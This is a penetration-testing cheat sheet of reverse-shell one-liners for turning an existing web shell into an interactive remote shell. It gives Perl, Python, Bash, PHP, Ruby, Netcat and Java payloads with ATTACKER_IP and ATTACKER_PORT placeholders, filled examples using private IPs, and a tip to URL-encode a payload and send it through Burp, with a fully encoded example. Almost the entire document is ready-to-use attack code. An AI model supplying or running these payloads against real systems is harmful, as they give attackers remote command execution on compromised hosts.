# Web Shell to Reverse Shell

Different scripts to get a reverse shell from an existing web shell. 

### **Bold**= **ATTACKER_IP** *and* **ATTACKER_PORT**

# Perl

`perl -e 'use Socket;$i="`**ATTACKER_IP**`";$p=`**ATTACKER_PORT**`;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

# Python

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("`**ATTACKER_IP**`",`**ATTACKER_PORT**`));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

# Bash

`bash -i >& /dev/tcp/`**ATTACKER_IP**`/`**ATTACKER_PORT**` 0>&1`

**Example:** `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

# PHP

If it doesn’t work, try 4, 5, 6, etc

`php -r '$sock=fsockopen("`**ATTACKER_IP**`",`**ATTACKER_PORT**`);exec("/bin/sh -i <&3 >&3 2>&3");'`

**Example:** `php -r '$sock=fsockopen("10.0.0.1",4321);exec("/bin/sh -i <&3 >&3 2>&3");'`

# Ruby

`ruby -rsocket -e'f=TCPSocket.open("`**ATTACKER_IP**`",`**ATTACKER_PORT**`).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

**Example:** `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4321).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`


# Netcat

`nc -nv`**ATTACKER_IP** **ATTACKER_PORT**` -e /bin/sh`

`nc -nv` **ATTACKER_IP** **ATTACKER_PORT**` -e /bin/bash`

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc`**ATTACKER_IP** **ATTACKER_PORT**` >/tmp/f`

**Example:** `nc -nv 10.0.0.1 4321 -e /bin/sh`

**Example:** `nc -nv 10.0.0.1 4321 -e /bin/bash`

**Example:** `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4321 >/tmp/f`

# Java

`r = Runtime.getRuntime()` 

`p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/`**ATTACKER_IP**`/`**ATTACKER_PORT**`;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])p.waitFor()`

**Example:** `r = Runtime.getRuntime()`

`p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4321;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])p.waitFor()`

# IMPORTANT

If we don't get a connection back, try to URL encode the payload and execute with Burp or in the URL bar directly.

**Example in Python:**

`python -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.33.159",
53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

**URL Encoding:**

%70%79%74%68%6f%6e%20%2d%63%20%27%69%6d%70%6f%72%74%0a%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%33%33%2e%31%35%39%22%2c%0a%35%33%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%29%3b%27






